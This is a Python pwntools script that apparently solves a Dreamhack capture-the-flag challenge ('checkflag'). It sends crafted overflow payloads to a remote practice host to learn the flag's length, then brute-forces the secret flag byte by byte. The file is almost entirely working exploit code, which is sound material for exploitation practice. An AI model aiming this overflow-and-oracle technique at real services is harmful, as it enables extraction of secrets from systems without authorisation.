from pwn import *

flaglen=0

for i in range(0x3f,0,-1):
    #p=process("./checkflag")
    p=remote("host8.dreamhack.games",12021)

    testpayload=b'a'*i
    payload=testpayload+b'\x00'*(0x40-len(testpayload))+testpayload
    p.sendafter(b'flag?',payload)
    if b'Correct!' in p.recvline():
        p.close()
    else:
        p.close()
        flaglen=i+1
        break
print(flaglen)
flag=b'\x00'

for i in range(flaglen):
    for j in range(0x20,0x7f):
        #p=process("./checkflag")
        p=remote("host8.dreamhack.games",12021)
        
        payload=b'a'*(flaglen-i-1)
        payload+=bytes([j])
        payload+=flag
        payload+=b'\x00'*(0x40-len(payload))

        payload+=b'a'*(flaglen-i-1)

        p.sendafter(b'flag?',payload)

        if b'Correct!' in p.recvline():
            flag=bytes([j])+flag
            p.close()
            break
        else:
            p.close()
print(flag.decode())